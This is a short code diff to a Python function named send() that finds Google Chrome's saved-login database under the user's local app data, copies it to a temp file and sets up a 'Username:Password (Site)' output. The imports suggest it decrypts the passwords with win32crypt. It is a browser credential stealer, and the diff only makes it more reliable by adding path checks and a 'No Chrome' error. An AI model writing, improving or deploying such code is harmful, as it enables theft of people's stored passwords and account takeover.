@@ -5,10 +5,16 @@ def send():
     import os, sqlite3, win32crypt, shutil
     sourceFileWithLogin = '%s\Google\Chrome\User Data\Profile 1\Login Data' % os.getenv('localappdata')
     sourceFileWithoutLogin = '%s\Google\Chrome\User Data\Default\Login Data' % os.getenv('localappdata')
-    if len(open(sourceFileWithoutLogin).readlines()) == 0:
-    	sourceFile = sourceFileWithLogin
+    if os.path.exists(sourceFileWithoutLogin) and \
+        len(open(sourceFileWithoutLogin).readlines()) == 0 and \
+        os.path.exists(sourceFileWithLogin):
+        sourceFile = sourceFileWithLogin
     else:
-    	sourceFile = sourceFileWithoutLogin
+        if os.path.exists(sourceFileWithoutLogin) and\
+            not len(open(sourceFileWithoutLogin).readlines()) == 0:
+            sourceFile = sourceFileWithoutLogin
+        else:
+            raise Exception("No Chrome")
     targetFile = '%s\TempData_C' % os.getenv('localappdata')
     result = "<Username>:<Password> (Site)\n"
     shutil.copy(sourceFile, targetFile)
